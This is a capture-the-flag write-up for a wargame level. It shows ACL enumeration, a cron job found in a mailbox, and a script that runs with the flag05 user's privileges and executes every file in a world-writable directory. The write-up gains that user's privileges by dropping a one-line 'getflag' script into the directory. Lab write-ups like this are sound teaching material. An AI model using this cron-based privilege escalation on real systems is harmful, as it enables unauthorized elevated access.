# foothold

Enumeration is key, I already know everything I neet to know about `level05`,
nothing, **nothing**, can surprise me.

So this user has on apache site, but is the one I used for level04, so let's
forget about it.

This user also has a mailbox in `/var/mail/level05`.

And some weird files with ACLs:

```raw
# file: /var/mail/level05
USER   root      rw-
user   flag05    r--
GROUP  mail      r--
mask             r--
other            r--

# file: /opt/openarenaserver
USER   root      rwx  rwx
user   level05   rwx  rwx
user   flag05    rwx  rwx
GROUP  root      r-x  r-x
mask             rwx  rwx
other            r-x  r-x

# file: /usr/sbin/openarenaserver
USER   flag05    rwx
user   level05   r--
GROUP  flag05    r-x
mask             r-x
other            ---
```

So... let's check the mailbox first, this seems fun.

So... what a same, the mailbox is just some cron job syntax:
```raw
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

So, let's take as a hint, although `pspy` did not found that earlier, but well,
let's continue.

`/opt/openarenaserver/` is an empty directory... interesting.

`/usr/sbin/openarenaserver` is a shell script, that iterates every file in the
`/opt/openarenaserver` directory... that's our exploit.

# exploit

The `/usr/sbin/openarenaserver` script iterates every file in
`/opt/openarenaserver`, and for each entry, it runs:
```bash
(ulimit -t 5; bash -x "$i")
```

So, it uses a subshell and limits the runtime of the commands executed within it
to 5 seconds, so our `bash -x "$i"` will have 5 seconds to get us the flag.

The bash `-x` option just opens bash in debug mode, it will pint a trace of
every command, very useful for debbuging scripts like `bash -x ./my-script.sh`,
but in this case is irrelevant, we don't care if bash runs in debbuging mode or
not.

For reference, this is the code:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So we just need to create a file and it will be executed with bash,
let's proceed to the injection:
```bash
echo 'getflag > /dev/shm/flag' > /opt/openarenaserver/foo
```

And wait for the cron job to run and execute it...

Let's do a quick `watch` so we know when the file is removed:
```bash
watch ls /opt/openarenaserver
```

And wait...

And wait...

And wait...

And we have the flag! Another easy one!
